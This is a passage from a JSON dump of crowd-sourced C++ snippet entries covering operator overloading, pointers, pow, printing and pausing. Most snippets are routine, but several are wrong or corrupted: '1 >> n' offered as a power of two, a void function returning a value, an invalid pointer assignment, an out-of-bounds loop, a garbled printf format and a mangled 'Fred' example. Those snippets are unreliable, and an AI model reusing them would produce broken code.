    "description": "// money.h -- define the prototype class Money {    public:       Money & operator += (const Money &rhs); }  // money.cpp -- define the implementation Money& Money :: operator += (const Money &rhs) {    // Yadda Yadda       return *this; }\n// This will substract one vector (math vector) from another // Good example of how to use operator overloading  vec2 operator - (vec2 const &other) {     return vec2(x - other.x, y - other.y); }\nclass Point { public: \tPoint& operator++() { ... }\t\t// prefix \tPoint operator++(int) { ... }\t// postfix   \tfriend Point& operator++(Point &p);\t\t\t// friend prefix   \tfriend Point operator++(Point &p, int);\t\t// friend postfix   \t// in Microsoft Docs written \"friend Point& operator++(Point &p, int);\" }; \n",
    "reg_date": "2021-10-12T11:38:19.000Z"
  },
  {
    "id": 1070,
    "keyword": null,
    "link": null,
    "title": " c++ over load oprator to print variable of clas",
    "description": "ostream& operator<< (ostream& out, graph g) {         for (int i = 0; i < g.size; ++i) {             for (int j = 0; j < g.size; ++j)                  out << (g.grph[i][j] ? \"true\" : \"false\") << \"\\t\";             out << endl;         }         return out;     }\n",
    "reg_date": "2021-10-12T11:38:19.000Z"
  },
  {
    "id": 1071,
    "keyword": null,
    "link": null,
    "title": " c++ overload < operator",
    "description": "struct Foo {     double val;     friend bool operator<(const Foo& l, const Foo& r)     {       \t//Custom comparison for l < r goes here         return l.val < r.val;      } };\n",
    "reg_date": "2021-10-12T11:38:19.000Z"
  },
  {
    "id": 1072,
    "keyword": null,
    "link": null,
    "title": " c++ overload operator",
    "description": "// money.h -- define the prototype class Money {    public:       Money & operator += (const Money &rhs); }  // money.cpp -- define the implementation Money& Money :: operator += (const Money &rhs) {    // Yadda Yadda       return *this; }\n#include <iostream>  class ExampleClass {   public:     ExampleClass() {}   \tExampleClass(int ex) {       example_ = 0;     }     int&       example()        { return example_; }     const int& example() const  { return example_; }   \t//Overload the \"+\" Operator   \tExampleClass operator+ (const ExampleClass& second_object_of_class) {     \tExampleClass object_of_class;     \tobject_of_class.example() = this -> example() + second_object_of_class.example();     \treturn object_of_class;   \t}   private:   \tint example_; };  int main() {   ExampleClass c1, c2;   c1.example() = 1;   c2.example() = 2;   ExampleClass c3 = c1 + c2;   //Calls operator+() of c1 with c2 as second_object_of_class   //c3 gets set to object_of_class   std::cout << c3.example(); }\n#include <iostream> #include <string>   class Car { private:     std::string m_make;     std::string m_model;   public:     Car(const std::string& make, const std::string& model)         : m_make{ make }, m_model{ model }     {     }       friend bool operator== (const Car &c1, const Car &c2);     friend bool operator!= (const Car &c1, const Car &c2); };   bool operator== (const Car &c1, const Car &c2) {     return (c1.m_make== c2.m_make &&             c1.m_model== c2.m_model); }   bool operator!= (const Car &c1, const Car &c2) {     return !(c1== c2); }   int main() {     Car corolla{ \"Toyota\", \"Corolla\" };     Car camry{ \"Toyota\", \"Camry\" };       if (corolla == camry)         std::cout << \"a Corolla and Camry are the same.\\n\";       if (corolla != camry)         std::cout << \"a Corolla and Camry are not the same.\\n\";       return 0; }\n#include <iostream> using namespace std;  class Box {    public:       double getVolume(void) {          return length * breadth * height;       }       void setLength( double len ) {          length = len;       }       void setBreadth( double bre ) {          breadth = bre;       }       void setHeight( double hei ) {          height = hei;       }              // Overload + operator to add two Box objects.       Box operator+(const Box& b) {          Box box;          box.length = this->length + b.length;          box.breadth = this->breadth + b.breadth;          box.height = this->height + b.height;          return box;       }           private:       double length;      // Length of a box       double breadth;     // Breadth of a box       double height;      // Height of a box };  // Main function for the program int main() {    Box Box1;                // Declare Box1 of type Box    Box Box2;                // Declare Box2 of type Box    Box Box3;                // Declare Box3 of type Box    double volume = 0.0;     // Store the volume of a box here      // box 1 specification    Box1.setLength(6.0);     Box1.setBreadth(7.0);     Box1.setHeight(5.0);      // box 2 specification    Box2.setLength(12.0);     Box2.setBreadth(13.0);     Box2.setHeight(10.0);      // volume of box 1    volume = Box1.getVolume();    cout << \"Volume of Box1 : \" << volume <<endl;      // volume of box 2    volume = Box2.getVolume();    cout << \"Volume of Box2 : \" << volume <<endl;     // Add two object as follows:    Box3 = Box1 + Box2;     // volume of box 3    volume = Box3.getVolume();    cout << \"Volume of Box3 : \" << volume <<endl;     return 0; }\n",
    "reg_date": "2021-10-12T11:38:19.000Z"
  },
  {
    "id": 1073,
    "keyword": null,
    "link": null,
    "title": " c++ overloaded == operator",
    "description": "#include <iostream> #include <string>   class Car { private:     std::string m_make;     std::string m_model;   public:     Car(const std::string& make, const std::string& model)         : m_make{ make }, m_model{ model }     {     }       friend bool operator== (const Car &c1, const Car &c2);     friend bool operator!= (const Car &c1, const Car &c2); };   bool operator== (const Car &c1, const Car &c2) {     return (c1.m_make== c2.m_make &&             c1.m_model== c2.m_model); }   bool operator!= (const Car &c1, const Car &c2) {     return !(c1== c2); }   int main() {     Car corolla{ \"Toyota\", \"Corolla\" };     Car camry{ \"Toyota\", \"Camry\" };       if (corolla == camry)         std::cout << \"a Corolla and Camry are the same.\\n\";       if (corolla != camry)         std::cout << \"a Corolla and Camry are not the same.\\n\";       return 0; }\n",
    "reg_date": "2021-10-12T11:38:19.000Z"
  },
  {
    "id": 1074,
    "keyword": null,
    "link": null,
    "title": " c++ overloaded equality check operator",
    "description": "#include <iostream> #include <string>   class Car { private:     std::string m_make;     std::string m_model;   public:     Car(const std::string& make, const std::string& model)         : m_make{ make }, m_model{ model }     {     }       friend bool operator== (const Car &c1, const Car &c2);     friend bool operator!= (const Car &c1, const Car &c2); };   bool operator== (const Car &c1, const Car &c2) {     return (c1.m_make== c2.m_make &&             c1.m_model== c2.m_model); }   bool operator!= (const Car &c1, const Car &c2) {     return !(c1== c2); }   int main() {     Car corolla{ \"Toyota\", \"Corolla\" };     Car camry{ \"Toyota\", \"Camry\" };       if (corolla == camry)         std::cout << \"a Corolla and Camry are the same.\\n\";       if (corolla != camry)         std::cout << \"a Corolla and Camry are not the same.\\n\";       return 0; } \nlass Fred { public:   // ... }; if    // Without operator overloading:   Fred add(const Fred& x, const Fred& y);   Fred mul(const Fred& x, const Fred& y);   Fred f(const Fred& a, const Fred& b, const Fred& c)   {     return add(add(mul(a,b), mul(b,c)), mul(c,a));    // Yuk...   } else   // With operator overloading:   Fred operator+ (const Fred& x, const Fred& y);   Fred operator* (const Fred& x, const Fred& y);   Fred f(const Fred& a, const Fred& b, const Fred& c)   {     return a*b + b*c + c*a;   } #endif\n",
    "reg_date": "2021-10-12T11:38:19.000Z"
  },
  {
    "id": 1075,
    "keyword": null,
    "link": null,
    "title": " c++ overwrite file",
    "description": "#include <fstream>  int main () {    std::ofstream ofs(\"test.txt\", std::ofstream::trunc);     ofs << \"lorem ipsum\";     ofs.close(); }\n",
    "reg_date": "2021-10-12T11:38:20.000Z"
  },
  {
    "id": 1076,
    "keyword": null,
    "link": null,
    "title": " c++ parse int",
    "description": "std::string s = \"10\"; int i = std::stoi(s);\n#include <iostream> #include <string> using namespace std; int main() {       string s = \"10\";       try     {         int i = stoi(s);         cout << i << '\\n';     }     catch (invalid_argument const &e)     {         cout << \"Bad input: std::invalid_argument thrown\" << '\\n';     }     catch (out_of_range const &e)     {         cout << \"Integer overflow: std::out_of_range thrown\" << '\\n';     }       return 0; }\natoi( str.c_str() )\n",
    "reg_date": "2021-10-12T11:38:20.000Z"
  },
  {
    "id": 1077,
    "keyword": null,
    "link": null,
    "title": " c++ pass argument to singleton",
    "description": "class Questionnary {   std::string _str;    static Questionnary& getInstanceImpl(std::string* const s = nullptr)   {     static Questionnary instance{ s };     return instance;   }    Questionnary(std::string* const s)     : _str{ s ? move(*s) : std::string{} } // employ move ctor   {     if (nullptr == s)       throw std::runtime_error{ \"Questionnary not initialized\" };   }  public:   static Questionnary& getInstance()   {     return getInstanceImpl();   }   static void init(std::string s) // enable moving in   {     getInstanceImpl(&s);   }    Questionnary(Questionnary const&) = delete;   void operator=(Questionnary const&) = delete; }; \n",
    "reg_date": "2021-10-12T11:38:20.000Z"
  },
  {
    "id": 1078,
    "keyword": null,
    "link": null,
    "title": " c++ passing vector to function",
    "description": "// Pass by value void print(std::vector<int> arr) { }  // Pass by reference void print(std::vector<int>& arr) { }\n",
    "reg_date": "2021-10-12T11:38:20.000Z"
  },
  {
    "id": 1079,
    "keyword": null,
    "link": null,
    "title": " c++ pause",
    "description": "#include <Windows.h>  int main() { \t//do stuff \tsystem(\"Pause\"); }\n//On windows. #include<windows.h> Sleep(milliseconds);  //On linux. #include<unistd.h> unsigned int microsecond = 1000000; usleep(3 * microsecond);//sleeps for 3 second  // c++ 11 for high resulution.  #include <chrono> #include <thread>  int main() {     using namespace std::this_thread; // sleep_for, sleep_until     using namespace std::chrono; // nanoseconds, system_clock, seconds      sleep_for(nanoseconds(10));     // or      sleep_until(system_clock::now() + seconds(1)); }  // C++ 14 for high resuluton.  #include <chrono> #include <thread>  int main() {     using namespace std::this_thread;     // sleep_for, sleep_until     using namespace std::chrono_literals; // ns, us, ms, s, h, etc.     using std::chrono::system_clock;      sleep_for(10ns);   \t// or     sleep_until(system_clock::now() + 1s); }\nsystem(\"pause\");\n// This is only one of many ways but you can use  getchar();\n",
    "reg_date": "2021-10-12T11:38:20.000Z"
  },
  {
    "id": 1080,
    "keyword": null,
    "link": null,
    "title": " c++ pause linux",
    "description": "//replaced system(\"pause\") for linux friendly cin.ignore; //if you have newline before this line, then you should add this(or just use it because why not?) cin.get(); // waits for a character (or just waits for your enter)\n",
    "reg_date": "2021-10-12T11:38:20.000Z"
  },
  {
    "id": 1081,
    "keyword": null,
    "link": null,
    "title": " c++ pi float",
    "description": "const float pi = 2 * acos(0.0f);\n",
    "reg_date": "2021-10-12T11:38:20.000Z"
  },
  {
    "id": 1082,
    "keyword": null,
    "link": null,
    "title": " c++ pointer",
    "description": "#include <iostream> using namespace std; int main(){    //Pointer declaration    int *p, var=101;      //Assignment    p = &var;     cout<<\"Address of var: \"<<&var<<endl;    cout<<\"Address of var: \"<<p<<endl;    cout<<\"Address of p: \"<<&p<<endl;    cout<<\"Value of var: \"<<*p;    return 0; }\n#include <iostream>  using namespace std;  int main () {    int  var = 20;   // actual variable declaration.    int  *ip;        // pointer variable      ip = &var;       // store address of var in pointer variable     cout << \"Value of var variable: \";     cout << var << endl; //Prints \"20\"     // print the address stored in ip pointer variable    cout << \"Address stored in ip variable: \";    cout << ip << endl; //Prints \"b7f8yufs78fds\"     // access the value at the address available in pointer    cout << \"Value of *ip variable: \";    cout << *ip << endl; //Prints \"20\"     return 0; }\n#include <iostream>  using namespace std; // isualize this on http://pythontutor.com/cpp.html#mode=edit int main() {    double* account_pointer = new double;    *account_pointer = 1000;    cout << \"Allocated one new variable containing \" << *account_pointer       << endl;    cout << endl;     int n = 10;    double* account_array = new double[n];    for (int i = 0; i < n; i++)    {       account_array[i] = 1000 * i;    }       cout << \"Allocated an array of size \" << n << endl;    for (int i = 0; i < n; i++)    {       cout << i << \": \" << account_array[i] << endl;    }    cout << endl;     // Doubling the array capacity     double* bigger_array = new double[2 * n];    for (int i = 0; i < n; i++)    {       bigger_array[i] = account_array[i];    }    delete[] account_array; // Deleting smaller array    account_array = bigger_array;    n = 2 * n;     cout << \"Now there is room for an additional element:\" << endl;    account_array[10] = 10000;    cout << 10 << \": \" << account_array[10] << endl;            delete account_pointer;    delete[] account_array; // Deleting larger array        return 0; }\n// my first pointer #include <iostream> using namespace std;  int main () {   int firstvalue, secondvalue;   int * mypointer; //creates pointer variable of type int    mypointer = &firstvalue;   *mypointer = 10;   mypointer = &secondvalue;   *mypointer = 20;   cout << \"firstvalue is \" << firstvalue << '\\n';   //firstvalue is 10   cout << \"secondvalue is \" << secondvalue << '\\n'; //secondvalue is 20   return 0; }\n#include <iostream> using std::cout;  int main() {   /*    Some things to keep in mind:   \t-you shouldn't circumvent the type system if you are creating raw ptrs   \tand don't need to \"type pun\" or cast (don't use void ptrs)     -ptr types only reference memory (which are integers), not actual data, thus     they should not be treated as data types     char* is just 1 byte of mem, int* is just 4 bytes of mem, etc     - '*' means that you are creating a pointer which \"points\" to the mem address     of a variable     - '&', in this case, means \"get the mem address of this variable\"   */      void* ptr; // a pointer that doesn't reference a certain size of memory   int* int_ptr; // a pointer that points to data with   \t\t\t\t// only 4 bytes of memory (on stack)      int a = 5; // allocates 4 bytes of mem and stores \"5\" there (as a primitive)   ptr = &a; // can only access the memory address of 'a' (not the data there)      int b = 45;    int_ptr = &b; // can access both memory address and data of 'b'      cout << ptr << \"\\n\"; // prints mem address of 'a'   /*cout << *ptr << \"\\n\"; <- this will error out; a void ptr cannot be    \t\t\t\t\t\t\t derefrenced */   cout << *(int*)ptr << \"\\n\"; // type punning to get around void ptr (extra work)      cout << int_ptr << \"\\n\"; // mem address of b   cout << *int_ptr << \"\\n\"; // data stored at b      /* -- OUTPUTS -- */   /*   \tsome memory address (arbitrary) which contains 05 00 00 00 as its data   \t5     some memory address (arbitrary) which contains 2D 00 00 00 as its data     45   */      return 0; // you only need this if \"main\" isnt the linker entry point   \t\t\t// you also don't care      // ur also probably wondering why I didn't using namespace std... cherno }\n#include <iostream>  void pointers_with_dynamic_memory() { \tint  arr_size;   // arr_size can contain an integer     int* x;          // x can contain the memory address of an integer.          std::cout << \"enter an integer > 0: \";   \tstd::cin >> arr_size;           // value of x is the starting address of a heap-allocated block ints\t     x        = new int[arr_size];        \tx[0]     = 10;  // set first element of array to 10     *x       = 50;  // set first element of array to 50     *(x + 1) = 100; // +1 offsets automatically by the value of sizeof(int)        delete [] x; }\n",
    "reg_date": "2021-10-12T11:38:20.000Z"
  },
  {
    "id": 1083,
    "keyword": null,
    "link": null,
    "title": " c++ pointers",
    "description": "#include <iostream> using namespace std; int main(){    //Pointer declaration    int *p, var=101;      //Assignment    p = &var;     cout<<\"Address of var: \"<<&var<<endl;    cout<<\"Address of var: \"<<p<<endl;    cout<<\"Address of p: \"<<&p<<endl;    cout<<\"Value of var: \"<<*p;    return 0; }\nint myvar = 6; int pointer = &myvar; // adress of myvar int value = *pointer; // the value the pointer points to: 6\n#include <iostream>  using namespace std;  int main () {    int  var = 20;   // actual variable declaration.    int  *ip;        // pointer variable      ip = &var;       // store address of var in pointer variable     cout << \"Value of var variable: \";     cout << var << endl; //Prints \"20\"     // print the address stored in ip pointer variable    cout << \"Address stored in ip variable: \";    cout << ip << endl; //Prints \"b7f8yufs78fds\"     // access the value at the address available in pointer    cout << \"Value of *ip variable: \";    cout << *ip << endl; //Prints \"20\"     return 0; }\nvoid simple_pointer_examples() {     int   a;  // a can contain an integer \tint*  x;  // x can contain the memory address of an integer.   \tchar* y;  // y can contain the memory address of a char.   \tFoo*  z;  // z can contain the memory address of a Foo object.         a = 10;     x = &a;   // '&a' extracts address of a         std::cout <<  x << std::endl; // memory address of a => 0x7ffe9e25bffc     std::cout << *x << std::endl; //          value of a => 10 }\n#include <iostream>  using namespace std; // isualize this on http://pythontutor.com/cpp.html#mode=edit int main() {    double* account_pointer = new double;    *account_pointer = 1000;    cout << \"Allocated one new variable containing \" << *account_pointer       << endl;    cout << endl;     int n = 10;    double* account_array = new double[n];    for (int i = 0; i < n; i++)    {       account_array[i] = 1000 * i;    }       cout << \"Allocated an array of size \" << n << endl;    for (int i = 0; i < n; i++)    {       cout << i << \": \" << account_array[i] << endl;    }    cout << endl;     // Doubling the array capacity     double* bigger_array = new double[2 * n];    for (int i = 0; i < n; i++)    {       bigger_array[i] = account_array[i];    }    delete[] account_array; // Deleting smaller array    account_array = bigger_array;    n = 2 * n;     cout << \"Now there is room for an additional element:\" << endl;    account_array[10] = 10000;    cout << 10 << \": \" << account_array[10] << endl;            delete account_pointer;    delete[] account_array; // Deleting larger array        return 0; }\n// my first pointer #include <iostream> using namespace std;  int main () {   int firstvalue, secondvalue;   int * mypointer; //creates pointer variable of type int    mypointer = &firstvalue;   *mypointer = 10;   mypointer = &secondvalue;   *mypointer = 20;   cout << \"firstvalue is \" << firstvalue << '\\n';   //firstvalue is 10   cout << \"secondvalue is \" << secondvalue << '\\n'; //secondvalue is 20   return 0; }\n",
    "reg_date": "2021-10-12T11:38:20.000Z"
  },
  {
    "id": 1084,
    "keyword": null,
    "link": null,
    "title": " c++ poitner",
    "description": "// A pointer in c++ is a variable whose value is a memory address.   int main() {   \tint x;      // 'regular' int   \tint *y;     // 'pointer-to-an-int        x = 5;      // assign x some value which is an integer     y = &x;     // use the address-of operator to get the address of x;                 // store that value as the value of y.  \treturn 0;  }\n",
    "reg_date": "2021-10-12T11:38:20.000Z"
  },
  {
    "id": 1085,
    "keyword": null,
    "link": null,
    "title": " c++ power",
    "description": "#include <iostream> #include <cmath> using namespace std; int main () {   double base, exponent, result;\t\t   base = 3.4;\t   exponent = 4.4;\t   result = pow(base, exponent);\t\t   cout << base << \"^\" << exponent << \" = \" << result;\t\t   return 0; }\n/* pow example */ #include <stdio.h>      /* printf */ #include <math.h>       /* pow */  int main () {   printf (\"7 ^ 3 = %f\\n\", pow (7.0, 3.0) );   printf (\"4.73 ^ 12 = %f\\n\", pow (4.73, 12.0) );   printf (\"32.01 ^ 1.54 = %f\\n\", pow (32.01, 1.54) );   return 0; }\n",
    "reg_date": "2021-10-12T11:38:21.000Z"
  },
  {
    "id": 1086,
    "keyword": null,
    "link": null,
    "title": " c++ power of a number",
    "description": "#include <iostream> #include <cmath> using namespace std;  int main () { \tdouble base, exponent, result; \t \tbase = 3.4; \texponent = 4.4; \tresult = pow(base, exponent); \t \tcout << base << \"^\" << exponent << \" = \" << result; \t \treturn 0; }\ndouble pow(double x, double y);\n",
    "reg_date": "2021-10-12T11:38:22.000Z"
  },
  {
    "id": 1087,
    "keyword": null,
    "link": null,
    "title": " c++ power of two",
    "description": "int xSquared = pow(x, 2);\n",
    "reg_date": "2021-10-12T11:38:22.000Z"
  },
  {
    "id": 1088,
    "keyword": null,
    "link": null,
    "title": " c++ power operator",
    "description": "#include <iostream> #include <cmath> using namespace std; int main () {   double base, exponent, result;\t\t   base = 3.4;\t   exponent = 4.4;\t   result = pow(base, exponent);\t\t   cout << base << \"^\" << exponent << \" = \" << result;\t\t   return 0; }\n#include<cmath> //header file for pow fun      pow(a,b)    // a^b   \n#include <iostream> #include <cmath>  using std::cout; using std::cin;  int main() {   int base, exponent;   cout << \"Enter Base\";   cin >> base;   cout << \"Enter Exponent\";   cin >> exponent;   cout << pow(base, exponent); }  // Enter Base : 2 // Enter Exponent : 4 // 16\n// If not using any extra libraries // Powers of 2. If finding 2^n int main() {   int ans = 1 >> n; } // Suppose we want to find x ^ y void power(int x, int y) {   int ans = 1;   for (int i = 0; i < y; i++) {     ans *= x;   }   return ans; }\n",
    "reg_date": "2021-10-12T11:38:23.000Z"
  },
  {
    "id": 1089,
    "keyword": null,
    "link": null,
    "title": " c++ preprocessor commands",
    "description": "#include <iostream> using namespace std;  #define PI 3.14159  int main () {    cout << \"Value of PI :\" << PI << endl;      return 0; }\n",
    "reg_date": "2021-10-12T11:38:23.000Z"
  },
  {
    "id": 1090,
    "keyword": null,
    "link": null,
    "title": " c++ press any key",
    "description": "// On Windows: system(\"pause\");  // and on Mac and Linux: system(\"read\");\n",
    "reg_date": "2021-10-12T11:38:23.000Z"
  },
  {
    "id": 1091,
    "keyword": null,
    "link": null,
    "title": " c++ primality test",
    "description": "#include <iostream> using namespace std; bool isPrimeNumber(int n) {     if (n <= 1) return false;     if (n <= 3) return true;     if (n % 2 == 0 || n % 3 == 0) return false;        for (int i = 5; i * i <= n; i = i + 6)         if (n % i == 0 || n % (i + 2) == 0)             return false;        return true; }\n",
    "reg_date": "2021-10-12T11:38:23.000Z"
  },
  {
    "id": 1092,
    "keyword": null,
    "link": null,
    "title": " c++ prime number program",
    "description": "#include <iostream> using namespace std;  int main() {   int n, i;   bool isPrime = true;    cout << \"Enter a positive integer: \";   cin >> n;    for(i = 2; i <= n / 2; ++i)   {       if(n % i == 0)       {           isPrime = false;           break;       }   }   if (isPrime)       cout << \"This is a prime number\";   else       cout << \"This is not a prime number\";    return 0; }\n#include <iostream> using namespace std;  int main() {     int i, n;     bool isPrime = true;      cout << \"Enter a positive integer: \";     cin >> n;      // 0 and 1 are not prime numbers     if (n == 0 || n == 1) {         isPrime = false;     }     else {         for (i = 2; i <= n / 2; ++i) {             if (n % i == 0) {                 isPrime = false;                 break;             }         }     }     if (isPrime)         cout << n << \" is a prime number\";     else         cout << n << \" is not a prime number\";      return 0; } \n",
    "reg_date": "2021-10-12T11:38:23.000Z"
  },
  {
    "id": 1093,
    "keyword": null,
    "link": null,
    "title": " c++ print",
    "description": "#include <iostream>  int main() {   std::cout << \"Hello, World!\"; // prints 'Hello, World!' to the output.   return 0; }\nstd::cout << \" Something \";\n#include <iostream> using namespace std;  int main(){   cout<<\"Hello World!\"<< endl; // prints \"Hello World\"   return 0; }\n/*there are 2 ways of doing it.*/ #include <iostream> // including the main thing needed int main(){   std::cout << \"Text here.\";   //you could put using namespace std; so you just have to do   cout << \"Text Here.\";   //this isnt reccomended though.   printf(\"hi\");   //is also an option.   return 0; }\ncout << \"put text here\"\ncout << \"hello world\"\n",
    "reg_date": "2021-10-12T11:38:23.000Z"
  },
  {
    "id": 1094,
    "keyword": null,
    "link": null,
    "title": " c++ print byte as bit",
    "description": "#include <bitset> ...  char a = -58;     std::bitset<8> x(a); std::cout << x << '\\n';  short c = -315; std::bitset<16> y(c); std::cout << y << '\\n';\n",
    "reg_date": "2021-10-12T11:38:23.000Z"
  },
  {
    "id": 1095,
    "keyword": null,
    "link": null,
    "title": " c++ print colorful",
    "description": "//the following are UBUNTU/LINUX, and MacOS ONLY terminal color codes. #define RESET   \"\\033[0m\" #define BLACK   \"\\033[30m\"      /* Black */ #define RED     \"\\033[31m\"      /* Red */ #define GREEN   \"\\033[32m\"      /* Green */ #define YELLOW  \"\\033[33m\"      /* Yellow */ #define BLUE    \"\\033[34m\"      /* Blue */ #define MAGENTA \"\\033[35m\"      /* Magenta */ #define CYAN    \"\\033[36m\"      /* Cyan */ #define WHITE   \"\\033[37m\"      /* White */ #define BOLDBLACK   \"\\033[1m\\033[30m\"      /* Bold Black */ #define BOLDRED     \"\\033[1m\\033[31m\"      /* Bold Red */ #define BOLDGREEN   \"\\033[1m\\033[32m\"      /* Bold Green */ #define BOLDYELLOW  \"\\033[1m\\033[33m\"      /* Bold Yellow */ #define BOLDBLUE    \"\\033[1m\\033[34m\"      /* Bold Blue */ #define BOLDMAGENTA \"\\033[1m\\033[35m\"      /* Bold Magenta */ #define BOLDCYAN    \"\\033[1m\\033[36m\"      /* Bold Cyan */ #define BOLDWHITE   \"\\033[1m\\033[37m\"      /* Bold White */\n",
    "reg_date": "2021-10-12T11:38:23.000Z"
  },
  {
    "id": 1096,
    "keyword": null,
    "link": null,
    "title": " c++ print current time",
    "description": "// Current date/time based on current system time_t now = time(0);  // Convert now to tm struct for local timezone tm* localtm = localtime(&now); cout << \"The local date and time is: \" << asctime(localtm) << endl;  // Convert now to tm struct for UTC tm* gmtm = gmtime(&now); if (gmtm != NULL) { cout << \"The UTC date and time is: \" << asctime(gmtm) << endl; } else { cerr << \"Failed to get the UTC date and time\" << endl; return EXIT_FAILURE; } \n",
    "reg_date": "2021-10-12T11:38:23.000Z"
  },
  {
    "id": 1097,
    "keyword": null,
    "link": null,
    "title": " c++ print elements of vector to the console",
    "description": "#include <iostream> #include <vector>  int main() { \tstd::vector<int> myVector = {1, 2, 3, 4, 5, 6};  \tfor(int i = 0; i < myVector.size(); i++) \t{ \t\tstd::cout << myVector[i] << std::endl;                  //***** alternate method ******* \t\t//std::cout << myVector.at(i) << std::endl;\t\t \t}\t }\n",
    "reg_date": "2021-10-12T11:38:24.000Z"
  },
  {
    "id": 1098,
    "keyword": null,
    "link": null,
    "title": " c++ print every element in array",
    "description": "#include <iostream> using namespace std;  int main() {     int numbers[5] = {7, 5, 6, 12, 35};      cout << \"The numbers are: \";      //  Printing array elements     // using range based for loop     for (const int &n : numbers) {         cout << n << \"  \";     }       cout << \"\\nThe numbers are: \";      //  Printing array elements     // using traditional for loop     for (int i = 0; i < 5; ++i) {         cout << numbers[i] << \"  \";     }      return 0; }\n#include<iostream>  int main() {  \tint array[8] = {1,2,3,4,5,6,7,8};   \tint i = 0;      \twhile (i <= sizeof(array)/sizeof(int))     {      \tstd::cout << array[i];       \ti++;     } }\n",
    "reg_date": "2021-10-12T11:38:24.000Z"
  },
  {
    "id": 1099,
    "keyword": null,
    "link": null,
    "title": " c++ print hello world",
    "description": "#include <iostream>   int main(){  std::cout <<\"Hello World\" << std::endl;  return 0; } \n#include<iostream> using namespace std;  int main(){     cout << \"Hello World\" << endl;      return 0; }\n#include <iostream>  using namespace std; main() {   cout << \"Hello world\" << endl;  }\n// Your First C++ Program  #include <iostream>  int main() {     std::cout << \"Hello World!\";     return 0; }\n#include <bits/stdc++.h>  using namespace std;  int main(){ \tcout << \"hello world! \\n\";  }                                                     //code by goukl aakash\n#include <iostream> using namespace std;  int main() {   cout << \"Hello Fellow Developers\\nLet the fun begin!\";   return 0; }\n",
    "reg_date": "2021-10-12T11:38:24.000Z"
  },
  {
    "id": 1100,
    "keyword": null,
    "link": null,
    "title": " c++ print number not in scientific notation",
    "description": "std::cout<<fixed<<big_num;\n",
    "reg_date": "2021-10-12T11:38:24.000Z"
  },
  {
    "id": 1101,
    "keyword": null,
    "link": null,
    "title": " c++ print stack from top to bottom",
    "description": "void PrintStack(stack<int> s) {     if (s.empty())         return;     int x = s.top();     s.pop();     cout << x << ' ';     PrintStack(s);     s.push(x); }\n",
    "reg_date": "2021-10-12T11:38:24.000Z"
  },
  {
    "id": 1102,
    "keyword": null,
    "link": null,
    "title": " c++ print string",
    "description": "#include <iostream>  int main() {   std::cout << \"Hello, World!\"; // prints 'Hello, World!' to the output.   return 0; }\n#include <iostream> using namespace std;  int main(){   cout<<\"Hello World!\"<< endl; // prints \"Hello World\"   return 0; }\nstd::cout << \"\";\n#include <iostream> std::cout << someString << \"\\n\"; \n#include <iostream> using namespace std;  int main() {   cout << \"ENTER TEXT HERE\";   return 0; } \ncout << \"put text here\"\n",
    "reg_date": "2021-10-12T11:38:24.000Z"
  },
  {
    "id": 1103,
    "keyword": null,
    "link": null,
    "title": " c++ print the amount of odd integer between n and m",
    "description": "void oddNumbers(int n) {     int i;     for (i = 1; i <= n; i++) {         //condition to check ODD numbers         if (i % 2 != 0)             cout << i << \" \";     }     cout << \"\\n\"; }  // main code int main() {     int N;     // input the value of N     cout << \"Enter the value of N (limit): \";     cin >> N;      cout << \"EVEN numbers are...\\n\";     evenNumbers(N);      cout << \"ODD numbers are...\\n\";     oddNumbers(N);      return 0; }\n// C++ program to print all // Even and Odd numbers from 1 to N  #include <iostream> using namespace std;  // function : evenNumbers // description: to print EVEN numbers only. void evenNumbers(int n) {     int i;     for (i = 1; i <= n; i++) {         //condition to check EVEN numbers         if (i % 2 == 0)             cout << i << \" \";     }     cout << \"\\n\"; }  // function : oddNumbers // description: to print ODD numbers only. void oddNumbers(int n) {     int i;     for (i = 1; i <= n; i++) {         //condition to check ODD numbers         if (i % 2 != 0)             cout << i << \" \";     }     cout << \"\\n\"; }  // main code int main() {     int N;     // input the value of N     cout << \"Enter the value of N (limit): \";     cin >> N;      cout << \"EVEN numbers are...\\n\";     evenNumbers(N);      cout << \"ODD numbers are...\\n\";     oddNumbers(N);      return 0; } \n",
    "reg_date": "2021-10-12T11:38:25.000Z"
  },
  {
    "id": 1104,
    "keyword": null,
    "link": null,
    "title": " c++ print to standard error",
    "description": "#include <iostream>  int main(){ \tstd::cerr << \"this is a message for stdandard error\" << std::endl;   \treturn 0; }\n",
    "reg_date": "2021-10-12T11:38:25.000Z"
  },
  {
    "id": 1105,
    "keyword": null,
    "link": null,
    "title": " c++ print unsigned long",
    "description": "printf(\"%lu\\n\", unsigned_foo)\n",
    "reg_date": "2021-10-12T11:38:25.000Z"
  },
  {
    "id": 1106,
    "keyword": null,
    "link": null,
    "title": " c++ print variable",
    "description": "std::cout << \"\";\ncout << x; cout << \"X is: \" << x << endl; //endl is to end the line\n#include <iostream> #include <string>  int main( int argc, char* argv[] ) {     std::string my_arg;      // First argument is always the name of your program     std::cout << argv[0] << std::endl;      if( argc == 2 )     {         // Something has been passed in         my_arg = argv[1];         std::cout << \"Argument passed in is \" << my_arg << std::endl;     }      return 0; }\n#include <iostream>  std::cout << \"Hello, World!\" << std::endl;\n",
    "reg_date": "2021-10-12T11:38:25.000Z"
  },
  {
    "id": 1107,
    "keyword": null,
    "link": null,
    "title": " c++ print variable address",
    "description": "printf(\"%p\\n\",(void*)&a);\n",
    "reg_date": "2021-10-12T11:38:26.000Z"
  },
  {
    "id": 1108,
    "keyword": null,
    "link": null,
    "title": " c++ print vector without loop",
    "description": "template <typename T> std::ostream& operator<< (std::ostream& out, const std::vector<T>& v) {   if ( !v.empty() ) {     out << '[';     std::copy (v.begin(), v.end(), std::ostream_iterator<T>(out, \", \"));     out << \"\\b\\b]\";   }   return out; }\n",
    "reg_date": "2021-10-12T11:38:26.000Z"
  },
  {
    "id": 1109,
    "keyword": null,
    "link": null,
    "title": " c++ printf char as hex",
    "description": "printf(\"\u0002x\", (unsigned char) c);\n",
    "reg_date": "2021-10-12T11:38:26.000Z"
  },
  {
    "id": 1110,
    "keyword": null,
    "link": null,
    "title": " c++ product of vector",
    "description": "#include <functional> // multiplies #include <numeric> // accumulate // ... std::vector<int> v {2,3,4}; int result = std::accumulate(v.begin(), v.end(), 1, std::multiplies<int>());\n",
    "reg_date": "2021-10-12T11:38:26.000Z"
  },
  {
    "id": 1111,
    "keyword": null,
    "link": null,
    "title": " c++ program for addition of two numbers using functions",
